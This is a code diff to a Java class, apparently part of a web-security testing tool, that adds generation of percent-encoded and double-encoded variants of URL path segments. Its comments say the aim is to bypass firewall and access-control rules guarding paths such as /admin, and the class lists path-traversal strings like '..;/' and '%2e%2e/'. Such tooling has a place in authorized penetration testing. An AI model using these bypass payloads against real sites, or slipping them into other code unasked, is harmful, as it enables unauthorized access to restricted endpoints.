@@ -132,6 +132,20 @@ public class UrlPayloadProcessor {
             allPaths.add(String.join("/", lower));
         }
 
+        // Per-character percent-encoding of target segments. Bypasses WAF rules that
+        // match the raw segment text exactly (/admin) but are applied BEFORE the
+        // URL decoder runs — /%61dmin decodes to /admin on origin but looks different
+        // to a literal-match ACL. expandCaseVariants below ensures hex case variance.
+        for (int segIdx = 0; segIdx < pathSegments.size(); segIdx++) {
+            String seg = pathSegments.get(segIdx);
+            for (String encoded : expandCharEncodedVariants(seg)) {
+                List<String> ns = new ArrayList<>(pathSegments);
+                ns.set(segIdx, encoded);
+                String joined = String.join("/", ns);
+                allPaths.addAll(expandCaseVariants(joined));
+            }
+        }
+
         // Add query/extension suffix payloads to the last segment
         List<String> suffixPayloads = new ArrayList<>();
         if (!pathSegments.isEmpty()) {
@@ -161,6 +175,41 @@ public class UrlPayloadProcessor {
     private static final String[] TRAVERSAL_PRIMITIVES = {
             "../", "..%2f", "..;/", "%2e%2e/", "%2e%2e%2f"
     };
+
+    /**
+     * Generate per-character percent-encoded variants of a single path segment.
+     * Emits: each char encoded once (single level), each char encoded twice
+     * (double level), and the whole segment fully encoded.
+     * Only encodes printable ASCII alphanum and common path chars; non-ASCII bytes
+     * are skipped (would need UTF-8 byte-level encoding which we don't model here).
+     */
+    static List<String> expandCharEncodedVariants(String segment) {
+        LinkedHashSet<String> out = new LinkedHashSet<>();
+        for (int i = 0; i < segment.length(); i++) {
+            char c = segment.charAt(i);
+            if (!encodableChar(c)) continue;
+            String pfx = segment.substring(0, i);
+            String sfx = segment.substring(i + 1);
+            out.add(pfx + String.format("%%%02x", (int) c) + sfx);
+            out.add(pfx + String.format("%%25%02x", (int) c) + sfx);
+        }
+        StringBuilder full = new StringBuilder();
+        for (char c : segment.toCharArray()) {
+            if (encodableChar(c)) {
+                full.append(String.format("%%%02x", (int) c));
+            } else {
+                full.append(c);
+            }
+        }
+        out.add(full.toString());
+        return new ArrayList<>(out);
+    }
+
+    private static boolean encodableChar(char c) {
+        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
+                || (c >= '0' && c <= '9')
+                || c == '.' || c == '_' || c == '-';
+    }
 
     /**
      * Heuristic: does this payload represent a traversal operation (contains '..' in
